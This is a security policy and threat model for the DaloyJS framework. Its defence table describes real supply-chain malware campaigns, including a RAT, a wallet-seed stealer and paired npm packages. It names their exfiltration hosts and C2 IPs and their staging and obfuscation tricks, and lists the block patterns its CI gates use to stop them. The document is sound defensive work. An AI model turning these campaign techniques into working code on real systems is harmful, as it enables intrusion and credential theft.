# Security Policy

DaloyJS is a backend framework, so security issues are treated as release-blocking
work. Please report suspected vulnerabilities privately before opening public
issues or pull requests.

## Supported Versions

DaloyJS is currently pre-1.0. Security fixes target the latest published `0.x`
release and `main`.

| Version | Supported |
| --- | --- |
| Latest `0.x` | Yes |

## Reporting a Vulnerability

Use GitHub's private vulnerability reporting for this repository when available:

<https://github.com/daloyjs/daloy/security/advisories/new>

If that link is unavailable, open a minimal public issue asking for a private
security contact without sharing exploit details.

Please include:

- Affected version or commit.
- Runtime and adapter involved, if any.
- Reproduction steps or a small proof of concept.
- Expected impact and any known mitigations.

## Response Target

- Initial acknowledgement: within 3 business days.
- Triage decision: within 7 business days.
- Fix release: as soon as practical, prioritized ahead of normal roadmap work.

### Patch SLA (for downstream NIS2 / EU CRA procurement clauses)

EU procurement contracts written against NIS2 risk-management measures
(Article 21) and the Cyber Resilience Act increasingly demand explicit
upstream patch windows keyed to CVSS severity, measured **from the moment
the upstream patch becomes available** (see Aikido's
["Your Client Requires NIS2 Vulnerability Patching. Now What?"](https://www.aikido.dev/blog/your-client-requires-nis2-vulnerability-patching-now-what)).
For confirmed vulnerabilities in `@daloyjs/core` or `create-daloy`, the
upstream release commitment is:

| Severity (CVSS v3.1 base score) | Patch released within | Measured from |
| --- | --- | --- |
| **Critical** (9.0–10.0) | **48 hours** | Triage decision confirming the report |
| **High** (7.0–8.9) | **7 days** | Triage decision confirming the report |
| **Medium** (4.0–6.9) | **30 days** | Triage decision confirming the report |
| **Low** (0.1–3.9) | **90 days** | Triage decision confirming the report |

These are commitments for the **upstream patch** (a new `@daloyjs/core` /
`create-daloy` version on npm with a matching GitHub Security Advisory);
the consumer's own deploy window is the consumer's responsibility. SLA
timers start once triage has confirmed the report is in-scope and
reproducible — open questions, "won't fix" decisions, and reports that
turn out to be in user code rather than the framework do not consume the
clock. When a fix slips the SLA, the GitHub Security Advisory carries a
visible `slo-breach: …` note explaining why so downstream procurement can
record the cause rather than guess.

### Evidence produced per advisory (NIS2 documentation pattern)

For every confirmed vulnerability we publish a [GitHub Security
Advisory](https://github.com/daloyjs/daloy/security/advisories) (GHSA) and
request a CVE through GitHub's CNA. Each advisory carries the three
timestamps a NIS2-aligned procurement audit needs:

1. **Discovered** — date the private report landed in the inbox (or, for
   internally-discovered issues, the date of the first PR / commit
   referencing the class).
2. **Patch available** — the published `@daloyjs/core` / `create-daloy`
   version and the npm publish timestamp, bound to the source commit by
   the npm `--provenance` Sigstore attestation (§ npm publishing).
3. **Fix deployed** — for the framework itself, identical to (2); for the
   consumer, the consumer's `pnpm install` is the deploy event and is
   evidenced by the consumer's lockfile diff.

The advisory also lists the CVSS v3.1 vector, the affected version range,
the fixed version, and the `pnpm` / `npm` upgrade command. The npm
provenance attestation on the fixed tarball binds the patched bytes to the
public `release.yml` workflow run on the Rekor transparency log, so
auditors can verify (2) without trusting a vendor portal. The published
CycloneDX 1.5 and SPDX 2.3 SBOM (§ Aikido SBOM-standards mapping) is the
dependency-inventory of record for matching CVEs against installed
versions; the daily `pnpm audit --prod`
([`.github/workflows/vuln-scan.yml`](.github/workflows/vuln-scan.yml)) is
the upstream continuous-monitoring signal.

## Scope

Security reports are especially useful for:

- Request parsing, body limits, and content-type bypasses.
- Prototype pollution or unsafe JSON handling.
- Header injection and response splitting.
- Path traversal or router confusion.
- Authentication, timing, CORS, rate limit, and secure header middleware issues.
- Adapter-specific behavior that changes security guarantees across runtimes.

Please do not use destructive tests against systems you do not own.

---

## Threat model

DaloyJS is designed for the threat model of an **internet-facing HTTP API
running on a trusted runtime** (Node, Bun, Deno, or a managed serverless edge).
The framework assumes the runtime is not actively malicious; the network and
every HTTP client (browser, mobile, CLI, attacker) are untrusted.

### In scope (the framework MUST defend)

| Class | Built-in defense |
| --- | --- |
| Body-size DoS | Core-enforced streamed body read with hard cap (default 1 MiB); `Content-Length` rejected pre-read when oversize. |
| Prototype pollution via JSON | Core `safeJsonParse` strips `__proto__` / `constructor` / `prototype` via reviver on every parsed request body. JWT verification ([`src/jwt.ts`](src/jwt.ts)) applies the same reviver to the attacker-controlled JWT header and payload so polluted keys cannot ride into user code via `Object.assign`/spread on the returned claims. Closes the class described in [Aikido's prototype-pollution write-up](https://www.aikido.dev/blog/prevent-prototype-pollution). |
| Parameter-binding RCE (Spring4Shell-class) | The Node / web-standards equivalent of [Spring4Shell](https://snyk.io/blog/spring4shell-rce-vulnerability-glassfish-payara/) is an attacker who picks field **names** (query string, `application/x-www-form-urlencoded`, `multipart/form-data`) and lets the framework bind them onto nested object properties. Daloy's three non-JSON parsers in [`src/app.ts`](src/app.ts) (`queryToObject`, the urlencoded body branch, and the multipart `forEach`) all funnel keys through `isForbiddenObjectKey` from [`src/security.ts`](src/security.ts) and drop `__proto__` / `constructor` / `prototype` before assignment, so attacker-named fields cannot land as own properties and cannot poison downstream `Object.assign` / spread / deep-merge into config, sessions, or templates. Regression-tested in [`tests/security.test.ts`](tests/security.test.ts). |
| Header/response splitting | Core `sanitizeHeaderName` / `sanitizeHeaderValue` reject CRLF + NUL. |
| Path traversal | Router rejects `..` and `//` before walking. |
| Auth/router path-matching mismatch | Router is case-sensitive, performs no URL rewrites, and rejects `..` / `//` before walking. The `except()` matcher consumes the same `url.pathname` the router sees (no double-decode, no case folding), so case-mutated or rewrite-style paths cannot skip auth while still reaching a protected handler. Regression-tested against the Qinglong CVE-2026-3965 / CVE-2026-4047 class ([Snyk write-up](https://snyk.io/blog/qinglong-task-scheduler-rce-vulnerabilities/)) in [`tests/path-auth-bypass-regression.test.ts`](tests/path-auth-bypass-regression.test.ts). |
| Internal-header middleware bypass (Next.js [CVE-2025-29927](https://nvd.nist.gov/vuln/detail/CVE-2025-29927) class) | Daloy's `dispatch()` in [`src/app.ts`](src/app.ts) runs `onRequest` / `beforeHandle` / route middleware **unconditionally** on every request — there is no internal header, recursion marker, or sub-request tag that an external client can set to short-circuit middleware (the Next.js bug was `x-middleware-subrequest`, a header used internally to prevent middleware recursion that, when echoed back by an attacker, made the framework skip middleware entirely and grant unauthenticated access to protected routes — see the [Socket write-up](https://socket.dev/blog/next-js-patches-critical-middleware-vulnerability) and the [zhero;sec paper](https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware)). Daloy's `internal: true` route flag is a separate, **code-only** mechanism: such routes return 404 via the public `app.fetch()` and are reachable only via `app.inject()` (in-process). To keep that guarantee future-proof, the framework reserves the `x-daloy-internal-*` / `x-daloyjs-internal-*` inbound header namespace and rejects any request that carries one with `400 problem+json` (`assertNoReservedInternalHeaders` in [`src/security.ts`](src/security.ts), called from `dispatch()` after `assertNoDuplicateSingletonHeaders`). Regression-tested in [`tests/reserved-internal-headers.test.ts`](tests/reserved-internal-headers.test.ts). |
| Method confusion | Real **405** with `Allow` header. |
| Slow handlers / runaway loops | Core `requestTimeoutMs` aborts handlers (30 s default); Node adapter sets `requestTimeout` + `headersTimeout` + `maxHeaderSize`. |
| 5xx info disclosure | Production mode strips `detail` from 5xx problem+json automatically. |
| CRLF in user-controlled headers | All built-in middleware that emit headers from config (`basicAuth` realm, `csrf` cookie name, etc.) reject CRLF at construction time. |
| Credential timing attacks | First-party `timingSafeEqual()` plus `basicAuth()` verifier hooks designed for constant-time password checks. The CI gate `scripts/verify-secret-comparisons.ts` (run as `pnpm verify:secret-comparisons`) rejects the full family of short-circuiting comparisons exploited by the CCC CTF "Node.js timing attack" class ([Snyk write-up](https://snyk.io/blog/node-js-timing-attack-ccc-ctf/)) — `===`, `!==`, `==`, `!=`, `.startsWith()`, `.endsWith()`, `.includes()`, `.indexOf()`, and `.localeCompare()` against any header-derived value in `src/`. |
| Cross-origin forgery (CSRF) | First-party `csrf()` with two strategies (double-submit cookie + Fetch-Metadata, see [docs](https://daloyjs.dev/docs/security/csrf)). |
| Cross-Site WebSocket Hijacking (CSWSH) | `app.ws()` refuses-at-registration in production unless the route sets `allowedOrigins` (`"same-origin"`, a string allowlist, or a predicate) or explicitly opts in via `acknowledgeCrossOriginUpgrade: true`. The Origin check runs **before** `beforeUpgrade`, so an attacker's drive-by `new WebSocket(...)` is rejected with `403` before any cookie-bearing handler runs. Closes the Storybook [CVE-2026-27148](https://www.aikido.dev/blog/storybooks-websockets-attack) class of bug. |
| Scripted carding / card-testing attacks against checkout endpoints (Socket [`disgrasya` PyPI write-up](https://socket.dev/blog/malicious-pypi-package-targets-woocommerce-stores-with-automated-carding-attacks) — a `requests.Session`-based Python bot that GETs the product list to scrape `data-product_id`, POSTs `?wc-ajax=add_to_cart`, GETs the checkout page to harvest the `woocommerce-process-checkout-nonce` and the CyberSource `capture_context` *directly out of the HTML* (bypassing the frontend JS that was supposed to keep them session-bound), exfiltrates the stolen `cc|mm|yy|cvv` to an attacker-controlled `flextoken`-faking host (`railgunmisaka.com`), then replays a full `?wc-ajax=checkout` POST with randomized billing details to learn whether the stolen card is live — all from non-browser HTTP clients with no `Sec-Fetch-Site` / `Sec-Fetch-Mode` / `Sec-Fetch-Dest` headers and no real cross-origin browser context, blending in with normal traffic and defeating CSRF schemes that only check a token harvested off the same page) | Three first-party primitives close the script-driven half of this class end-to-end, and they are the same primitives the upstream [WooCommerce card-testing prevention guide](https://woocommerce.com/document/woopayments/fraud-and-disputes/card-testing/) recommends. **(a) Token-replay is moot under Fetch-Metadata CSRF:** `csrf({ strategy: "fetch-metadata" })` in [`src/middleware.ts`](src/middleware.ts) rejects any state-changing request whose `Sec-Fetch-Site` is `same-site` / `cross-site` and, when the header is missing entirely (the exact case for `requests` / `httpx` / `curl` / `wget` / Go `net/http` / Java `HttpClient` / .NET `HttpClient`), falls back to an Origin/Referer allowlist that a server-side bot has no way to satisfy — so even if the attacker scrapes a perfectly valid checkout nonce off the page, the replayed `?wc-ajax=checkout`-shape POST is refused with `403 CSRF: request origin could not be verified` **before** any payment-handler code runs. Unlike a WooCommerce-style page-bound nonce, the Fetch-Metadata check is not something an HTML scraper can harvest. **(b) Burst throttling on payment routes:** `rateLimit({ key: …, windowMs, max })` per-IP / per-account / per-card-bin on the checkout / add-to-cart / payment-intent routes bounds the *velocity* a card-testing bot needs (carding kits rely on testing hundreds of cards per minute to be profitable); pair it with `trustProxyHeaders: true` only when the app sits behind a trusted reverse proxy. **(c) Burst pressure containment:** `loadShedding()` caps concurrent in-flight checkout work so a card-testing burst cannot starve real shoppers' requests. Defense-in-depth: `secureHeaders()` ships CSP nonce + Trusted Types so a stored-XSS pivot cannot silently harvest a real browser session's checkout nonce / payment tokens for an attacker to replay. Out of scope (the framework will NOT defend): CAPTCHA / hCaptcha / Turnstile integration, ML-based fraud scoring, payment-gateway-specific velocity rules, billing-address-vs-AVS heuristics, and the merchant's own `< $5 order` blocking — those are the application's / PSP's responsibility. See the upstream Socket write-up for the malicious package IOCs (`disgrasya` PyPI, exfil host `railgunmisaka[.]com`, malicious versions `7.36.9` and above). |
| Clickjacking / MIME sniffing / cross-origin leakage | First-party `secureHeaders()` (CSP, HSTS, COOP, CORP, `X-Frame-Options`, `X-Content-Type-Options`, Permissions-Policy; CSP nonce + Trusted Types). |
| Malicious image uploads / ImageTragick (CVE-2016-3714) class | First-party `fileField()` validates magic bytes against the declared MIME and, by default whenever `magicBytes` is enabled, refuses scriptable image formats (SVG, MVG, MSL, PostScript / EPS) that ImageMagick and similar renderers can execute. See the [Snyk write-up on safe ImageMagick for Node](https://snyk.io/blog/safe-imagemagick-for-node/). Opt back in per route with `rejectScriptableImages: false` only if you sandbox the renderer (separate process, restricted ImageMagick `policy.xml`, no shell). |
| Uninitialized-memory leaks via the legacy `Buffer` API | Daloy's source is forbidden from calling `new Buffer(...)` or `Buffer.allocUnsafe*(...)` (both return memory that may contain bytes from previous allocations \u2014 cookies, tokens, decoded bodies). Enforced at PR time by `scripts/verify-no-unsafe-buffer.ts` (CI gate `pnpm verify:no-unsafe-buffer`), with a positive regression in [`tests/cookies-and-temporal-claims.test.ts`](tests/cookies-and-temporal-claims.test.ts) that walks the live `src/` tree. Adapter and binary code paths use `Uint8Array` or `Buffer.alloc(size)` instead. See the [Snyk write-up on exploiting `Buffer`](https://snyk.io/blog/exploiting-buffer/). |
| Runtime remote-fetch-and-execute carriers (`fast-draft` Open VSX / BlokTrooper-class worm where a compromised package activation fetches a GitHub-hosted shell script and pipes it into `sh`, deploying a RAT and infostealer) | `scripts/verify-no-remote-exec.ts` (run as `pnpm verify:no-remote-exec` in CI and in both publish jobs of [`release.yml`](.github/workflows/release.yml)) refuses any file under `src/**` that imports `node:child_process` / `child_process` (shell-out), imports `node:vm` / `vm` (compile downloaded code), calls bare `eval(...)` (member-access `.eval(...)` for Redis Lua is allowed), constructs `new Function(...)` from a string, or dynamically `import("https://...")` / `import("http://...")` of remote code. These are the exact primitives a BlokTrooper-style import-time payload (or the broader Shai-Hulud npm worm class) needs to land arbitrary code on a consumer's machine after `pnpm install`. Combined with `ignore-scripts=true` and `minimum-release-age=1440` in both root [`.npmrc`](.npmrc) and every scaffolded template `_npmrc`, a malicious republish of `@daloyjs/core` has nowhere to land the equivalent of `curl … | sh`. Closes the [Aikido BlokTrooper write-up](https://www.aikido.dev/blog/fast-draft-open-vsx-bloktrooper) class. Regression-tested in [`tests/cookies-and-temporal-claims.test.ts`](tests/cookies-and-temporal-claims.test.ts) (positive samples for each forbidden primitive, negative samples for member-access `.eval()` / commented-out imports, plus a live walk of `src/**`). |
| Known-vulnerable in-process JavaScript sandboxes (`vm2` sandbox-escape class, CVE-2026-26956 / [GHSA-ffh4-j6h5-pg66](https://github.com/patriksimek/vm2/security/advisories/GHSA-ffh4-j6h5-pg66), confirmed by [Socket](https://socket.dev/blog/free-certified-patches-for-critical-vm2-sandbox-escape) across **66** `vm2` releases from 0.2.2 through 3.10.4 on any Node.js version that exposes `WebAssembly.JSTag` — attacker-controlled JS reaching `VM.run()` escapes the sandbox and runs arbitrary OS commands on the host) | Daloy core declares **zero** runtime dependencies and forbids `node:vm` / `vm` imports in `src/**` via `verify:no-remote-exec`, so `vm2` cannot enter via core. As a belt-and-braces gate, `scripts/verify-no-vulnerable-sandboxes.ts` (run as `pnpm verify:no-vulnerable-sandboxes` in CI and in both publish jobs of [`release.yml`](.github/workflows/release.yml)) walks every tracked `package.json` (root, `packages/create-daloy`, every scaffolded template under `packages/create-daloy/templates/**`) **and** the root `pnpm-lock.yaml` and refuses to allow any direct dependency or resolved version of `vm2`, `vm2-sandbox-escape`, `safe-eval`, `notevil`, `static-eval`, or `eval-sandbox` — the in-process JS "sandboxes" with documented sandbox-escape / arbitrary-code-execution CVEs. Regression-tested in [`tests/cookies-and-temporal-claims.test.ts`](tests/cookies-and-temporal-claims.test.ts) (positive samples for each forbidden name across every dep bucket and the pnpm-9 lockfile shape, negative sample for benign `package.json` and lockfile content, plus a live walk of every tracked `package.json` and the root lockfile). For untrusted code execution, applications should rely on real isolation boundaries (separate process, container, or a fresh `isolated-vm` isolate) rather than any in-process JS sandbox. |
| Trusted-proxy header spoofing | `rateLimit({ trustProxyHeaders })` and `requestId({ trustIncoming })` default OFF; key generators must be explicit. |
| Leaked credentials in the published tarball (`.env`, `id_rsa`, hard-coded provider keys / JWTs / GitHub PATs / npm tokens, …) | Three layers. **(a) Whitelist:** `package.json#files` ships only `dist/` + `bin/` + `README.md` for `@daloyjs/core` and `bin/` + `templates/` + `README.md` for `create-daloy` — anything outside is excluded by npm before the tarball is assembled. **(b) Filename gate:** `scripts/verify-no-leaked-credentials.ts` (run as `pnpm verify:no-leaked-credentials` in CI and in both publish jobs of [`release.yml`](.github/workflows/release.yml) after `pnpm build`) refuses any `.env*` (other than `.env.example` / `.env.sample` / `.env.template`), `id_rsa*`, `*.pem`, `*.key`, `*.p12`, `*.pfx`, `.npmrc`, `.netrc`, `credentials*.json`, `secrets*.json`, `service-account*.json`, or `*.kdbx` inside the whitelisted paths. **(c) Content gate:** the same script scans every included file for AWS access key ids (`AKIA…`), GitHub PATs / OAuth / server-to-server / refresh / user-to-server / fine-grained tokens, npm access tokens (`npm_…`), Slack tokens (`xox?-…`), Stripe live secret keys (`sk_live_…`), Google API keys (`AIza…`), JWT-shaped strings (`eyJ…\.eyJ…\.…`), PEM `-----BEGIN … PRIVATE KEY-----` blocks, and npm-registry `_authToken=` lines. Closes the [Snyk "leaked credentials in packages" class](https://snyk.io/blog/leaked-credentials-in-packages/). Regression-tested in [`tests/cookies-and-temporal-claims.test.ts`](tests/cookies-and-temporal-claims.test.ts). |
| Invisible-Unicode supply-chain carriers (GlassWorm-class npm / VS Code worms that hide `eval()`'d payloads inside Unicode Tag characters, Trojan-Source bidi overrides, zero-width joiners, or Private-Use-Area code points) | `scripts/verify-no-invisible-unicode.ts` (run as `pnpm verify:no-invisible-unicode` in CI and in both publish jobs of [`release.yml`](.github/workflows/release.yml) after `pnpm build`) scans every file in the publishable tarball (`package.json#files` whitelist of both `@daloyjs/core` and `create-daloy`) **and** every in-repo source root (`src/`, `scripts/`, `bin/`, `examples/`, `packages/create-daloy/{bin,templates}/`) and refuses to publish if any file contains: Unicode Tag characters U+E0000–U+E007F (the [GlassWorm](https://www.aikido.dev/blog/glassworm-strikes-react-packages-phone-numbers) / [GlassWorm-2026](https://www.aikido.dev/blog/glassworm-returns-unicode-attack-github-npm-vscode) carrier), zero-width / word-joiner characters (U+200B/U+200C/U+200D/U+2060) mid-stream, bidi-override controls (U+202A–U+202E / U+2066–U+2069, [Trojan Source](https://trojansource.codes)), Private Use Area code points (U+E000–U+F8FF and the two supplementary planes), or a BOM (U+FEFF) anywhere other than the very first code point of the file. Each finding is reported with `path:line:column` and the offending `U+XXXX` so reviewers can locate the carrier in a hex editor — the chars render as nothing in every editor, every diff viewer, and every PR review UI. Regression-tested in [`tests/cookies-and-temporal-claims.test.ts`](tests/cookies-and-temporal-claims.test.ts) (positive samples for each forbidden class, negative samples for normal em-dash / smart-quote / Greek-letter usage, and a live walk of every published path and source root). |
| Visible-but-unreadable encoded-string obfuscation in supply-chain payloads (Socket [Obfuscation 101](https://socket.dev/blog/obfuscation-101-the-tricks-behind-malicious-code) class — string literals like `"\x68\x74\x74\x70\x73\x3a\x2f\x2fexample.com"` whose `\xXX` / `\u00XX` escapes hide a URL or shell command from human reviewers, and opaque base64 blobs handed straight to a decryptor + executor in the Fernet-style PyPI `capmostercloudclinet` shape — visible to grep but easy for a human reviewer to miss in a `dist/index.js` diff) | `scripts/verify-no-encoded-payloads.ts` (run as `pnpm verify:no-encoded-payloads` in CI and in the pre-publish `verify` job of [`release.yml`](.github/workflows/release.yml)) walks every file under `src/`, `scripts/`, `bin/`, `examples/`, and `packages/create-daloy/{bin,templates}/` and refuses to publish if any non-comment line contains a string literal whose body matches any of three obfuscation-carrier shapes: (a) **four or more consecutive `\xXX` hex escapes** — the article's example #1, the canonical way to hide a URL / `bash -c` / `wget` / `curl` string from a reviewer; (b) **four or more consecutive `\u00XX` (or `\u{00XX}`) escapes for printable ASCII** — the same trick spelled with the Unicode-escape syntax (high-bit Unicode escapes for legitimate non-ASCII text like `\u2603` are explicitly allowed); (c) **opaque base64 / base64url blobs of ≥ 200 chars with no whitespace** — the carrier shape used by the article's PyPI `capmostercloudclinet` example where the entire payload was wrapped in `Fernet(…).decrypt(b'gAAAAAB…')` and handed to `exec()`. Real URLs, JWTs (the `.`-separated three-segment shape), short hashes, JWKs (with `{}` punctuation), and SBOM JSON are unaffected. Closes the visible-carrier half of the Socket Obfuscation 101 catalog without disrupting any legitimate source. The executable half is already closed by `verify-no-remote-exec` (no `eval` / `new Function` / `child_process` / `vm` / remote dynamic `import`), so an attacker cannot land *either* the encoded carrier *or* the primitive that would interpret it. Test fixtures that legitimately need to exercise this gate live under `tests/` (excluded from the scan) so the framework can keep regression tests for the carrier shapes without tripping its own gate. Regression-tested in [`tests/cookies-and-temporal-claims.test.ts`](tests/cookies-and-temporal-claims.test.ts) (positive samples for each forbidden shape, negative samples for real URLs / single `\xNN` punctuation / non-ASCII Unicode escapes / JWT-shaped strings / short hashes, plus a live walk of `src/`, `scripts/`, `bin/`, and `examples/`). |
| In-process registry-exfiltration carriers (Socket [GemStuffer](https://socket.dev/blog/gemstuffer) class — a malicious package that, using only stdlib + `fetch`, disables TLS verification to scrape internal endpoints, fabricates host credential files, and POSTs scraped data directly to a public package registry's publish endpoint without ever shelling out) | `scripts/verify-no-registry-exfiltration.ts` (run as `pnpm verify:no-registry-exfiltration` in CI and in the publish job of [`release.yml`](.github/workflows/release.yml)) refuses any file under `src/**` that contains: (a) a TLS-verification bypass — `rejectUnauthorized: false` (object-literal property assigning `false`) or any mutation of `NODE_TLS_REJECT_UNAUTHORIZED`; (b) a `process.env.HOME = ...` mutation (GemStuffer's credential-injection primitive, used to redirect the home directory and drop a fabricated publish-token file); (c) a string literal naming a package-registry publish-API path — `registry.npmjs.org/-/npm/v1/...`, `rubygems.org/api/v1/gems`, `upload.pypi.org/legacy/`, or `crates.io/api/v1/crates/new` (the actual exfiltration endpoints — bare host references in user-facing docs/errors are still permitted); or (d) a reference to a host credential file (`~/.npmrc`, `~/.yarnrc[.yml]`, `~/.netrc`, `~/.gem/credentials`) that an attacker would slurp to steal publish tokens. Combined with `verify-no-remote-exec` (no `child_process` / no `vm` / no `eval` / no `new Function` / no remote dynamic `import`), a malicious republish of `@daloyjs/core` has no in-process exfiltration channel: it cannot shell out to `npm publish`, it cannot scrape internal endpoints with cert verification disabled, and it cannot POST a tarball directly to a registry endpoint from runtime code. Regression-tested in [`tests/cookies-and-temporal-claims.test.ts`](tests/cookies-and-temporal-claims.test.ts) (positive samples for each forbidden primitive, negative samples for inline-block-comment / string-literal mentions and equality reads of `process.env.HOME`, plus a live walk of `src/**`). |
| Lazarus / Jade Sleet paired-package npm campaign (Socket [social-engineering write-up](https://socket.dev/blog/social-engineering-campaign-npm-malware), [GitHub security alert](https://github.blog/2023-07-18-security-alert-social-engineering-campaign-targets-technology-industry-employees/) — a state-sponsored group ships two malicious npm packages that must run in sequence: the first stages a token at `$HOME/.vscode/jsontoken` from a typosquat C2 host, the second reads that token, POSTs it to `npmjsregister.com/getupdate.php`, writes the response to disk, and `child_process.exec`s it as a `node` script — with `NODE_TLS_REJECT_UNAUTHORIZED = 0` set process-wide so the staging fetch never raises a TLS error) | Five overlapping gates close this end-to-end. **(a) Install-time execution is off by default:** `ignore-scripts=true` in both the root [`.npmrc`](.npmrc) and every scaffolded template `_npmrc` blocks the `postinstall` / `preinstall` / `prepare` channel the campaign uses to land its first-stage payload — `pnpm install` never runs the malicious package's hooks. **(b) 24 h release-age cooldown:** `minimum-release-age=1440` in both root and template `_npmrc` keeps consumers off the early-installer hot path; the GitHub-attributed Jade Sleet packages were detected and yanked well inside this window. **(c) No `child_process` / no remote `import()` / no `eval` / no `new Function` in core:** `scripts/verify-no-remote-exec.ts` (run as `pnpm verify:no-remote-exec` in CI and in both publish jobs of [`release.yml`](.github/workflows/release.yml)) refuses the exact `child_process.exec('node ' + path)` primitive the second-stage package uses to detonate the downloaded payload, so a malicious republish of `@daloyjs/core` has nowhere to land it. **(d) No TLS-verification bypass in core:** `scripts/verify-no-registry-exfiltration.ts` (run as `pnpm verify:no-registry-exfiltration`) refuses any `NODE_TLS_REJECT_UNAUTHORIZED` mutation or `rejectUnauthorized: false`, so the campaign's `process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0` warm-up step cannot ride into core. **(e) Campaign-specific IOC blocks in core:** the same script refuses `~/.vscode/` path references (Daloy never touches the user's IDE config dir, and `$HOME/.vscode/jsontoken` is the exact paired-package token-handoff staging path) and the documented C2 host `npmjsregister.com`. Combined with [`pnpm verify:no-runtime-deps`](scripts/verify-no-runtime-deps.ts) (core ships **zero** runtime deps), a `sync-request`-style synchronous-HTTP first-stage transitive dep cannot enter the published tarball. Regression-tested in [`tests/cookies-and-temporal-claims.test.ts`](tests/cookies-and-temporal-claims.test.ts) (positive samples for the `.vscode/` handoff path and the `npmjsregister.com` C2 host, plus a live walk of `src/**`). |
| RATatouille / rand-user-agent supply-chain compromise (Aikido [write-up](https://www.aikido.dev/blog/catching-a-rat-remote-access-trojian-rand-user-agent-supply-chain-compromise) — the legitimate `rand-user-agent` package was hijacked and `2.0.83`, `2.0.84`, and `1.0.110` shipped a horizontally-hidden obfuscated payload inside `dist/index.js` that aliased `require` via `global['r'] = require` to bypass static `require('child_process')` detection, then `module.paths.push`ed a hidden `$HOME/.node_modules/node_modules` directory so it could `require('axios')` / `require('socket.io-client')` after silently `npm install`-ing them there, then opened a socket.io C2 channel to `http://85.239.62.36:3306` and POSTed exfiltrated files to `http://85.239.62.36:27017/u/f` — a full Remote Access Trojan with `cd` / `ss_upf` / `ss_upd` commands plus an arbitrary `child_process.exec` shell on every other input, with a Windows `Python3127` PATH-hijack backdoor for stealthy persistence) | Six overlapping gates close this end-to-end. **(a) Install-time execution is off by default:** `ignore-scripts=true` in both the root [`.npmrc`](.npmrc) and every scaffolded template `_npmrc` blocks the `postinstall` / `preinstall` / `prepare` channel a malicious republish would use to first run the payload — `pnpm install` of `@daloyjs/core` or a scaffolded template never runs the malicious package's hooks. **(b) 24 h release-age cooldown:** `minimum-release-age=1440` in both root and template `_npmrc` keeps consumers off the early-installer hot path; Aikido's automated pipeline detected `rand-user-agent@1.0.110` and the package was unpublished well inside this window. **(c) No `child_process` / no `vm` / no `eval` / no `new Function` / no remote `import()` in core:** `scripts/verify-no-remote-exec.ts` refuses every primitive the RATatouille payload needs to execute the attacker's shell commands, install side-loaded modules via `npm install`, or detonate a downloaded payload. **(d) No aliased-require to bypass static detection:** `scripts/verify-no-registry-exfiltration.ts` (run as `pnpm verify:no-registry-exfiltration` in CI and in both publish jobs of [`release.yml`](.github/workflows/release.yml)) refuses any `global.X = require` / `globalThis['X'] = require` assignment in `src/**` — the exact obfuscation trick RATatouille used so that a literal `require('child_process')` regex would not find it. **(e) No `module.paths` injection and no `.node_modules` hidden install dir:** the same script refuses any `module.paths.push(...)` / `module.paths.unshift(...)` mutation (the RATatouille primitive for making a side-installed `axios` / `socket.io-client` resolvable from a hidden home-directory dir) and refuses any reference to a leading-dot `.node_modules` path literal (the malware-specific hidden install dir under `$HOME` — real `node_modules` has no leading dot). **(f) Campaign-specific IOC blocks in core:** the same script refuses any raw-IPv4 `http(s)://` / `ws(s)://` URL literal in `src/**` (loopback `127.x`, unspecified-bind `0.0.0.0`, and `localhost` are allow-listed — every other raw-IP host is a DNS-less C2 IOC) and refuses the documented RATatouille C2 IP `85.239.62.36` as a bare-literal belt-and-braces gate. Combined with [`pnpm verify:no-runtime-deps`](scripts/verify-no-runtime-deps.ts) (core ships **zero** runtime deps, so `@daloyjs/core` consumers cannot transitively pull in a compromised `rand-user-agent` through us), a malicious republish of `@daloyjs/core` has no in-process channel left to land a RATatouille-shape RAT — the aliased-require trick is moot when there is no `child_process` to call through it, and side-loading a fetched `axios` is moot when there is no `.node_modules` path injection to make it resolvable. Regression-tested in [`tests/cookies-and-temporal-claims.test.ts`](tests/cookies-and-temporal-claims.test.ts) (positive samples for each forbidden primitive, allow-list cases for loopback / unspecified-bind / `localhost` raw-host URLs and benign `node_modules` paths, plus a live walk of `src/**`). |
| xrpl.js / Ripple SDK crypto-wallet seed-stealing supply-chain compromise (Aikido [write-up](https://www.aikido.dev/blog/xrp-supplychain-attack-official-npm-package-infected-with-crypto-stealing-backdoor) — the **official** `xrpl` Ripple SDK on npm, ~140k weekly downloads and ~2.9M monthly, was hijacked via a stolen maintainer npm token, and five backdoored versions `xrpl@{2.14.2, 4.2.1, 4.2.2, 4.2.3, 4.2.4}` were published inside one hour with a `checkValidityOfSeed` function inlined into the runtime bundle that POSTed the user's XRP wallet seed / private key to `https://0x9c.xyz` via a plain global `fetch`. None of the malicious code was ever mirrored to the public GitHub repo — no tag, no PR, no CI run — so the npm tarball was the **only** place the backdoor existed, defeating any "just review the upstream PRs" defense.) | Five overlapping gates close this end-to-end. **(a) 24 h release-age cooldown:** `minimum-release-age=1440` in both the root [`.npmrc`](.npmrc) and every scaffolded template `_npmrc` keeps consumers off the early-installer hot path; the five malicious xrpl versions were detected and yanked within an hour and would never have entered an install. **(b) Install-time execution is off by default:** `ignore-scripts=true` in both root and template `_npmrc` blocks the `postinstall` / `preinstall` / `prepare` channel a future compromise of this shape might also use. **(c) No transitive entry path through core:** [`pnpm verify:no-runtime-deps`](scripts/verify-no-runtime-deps.ts) keeps `@daloyjs/core` at **zero** runtime dependencies, so a compromised `xrpl` (or any other hijacked third-party package) cannot ride into a Daloy consumer's `node_modules` via us. **(d) No in-process exfiltration channel in core:** `scripts/verify-no-remote-exec.ts` (run as `pnpm verify:no-remote-exec` in CI and in both publish jobs of [`release.yml`](.github/workflows/release.yml)) refuses `child_process` / `vm` / bare `eval` / `new Function(…)` / remote dynamic `import("http(s)://…")`, so a malicious republish of `@daloyjs/core` itself has no primitive to drop in a `checkValidityOfSeed`-shape payload that downloads further code or shells out. **(e) Campaign-specific IOC block in core:** `scripts/verify-no-registry-exfiltration.ts` (run as `pnpm verify:no-registry-exfiltration` in CI and in both publish jobs of [`release.yml`](.github/workflows/release.yml)) refuses the documented exfiltration host `0x9c.xyz` as a bare-literal IOC — the xrpl backdoor used a registered domain rather than a raw-IPv4 C2, so the existing RATatouille raw-IP gate would not catch it on its own. Regression-tested in [`tests/cookies-and-temporal-claims.test.ts`](tests/cookies-and-temporal-claims.test.ts) (positive samples for the `0x9c.xyz` URL, bare-host, and case-insensitive variants, plus the live walk of `src/**`). |
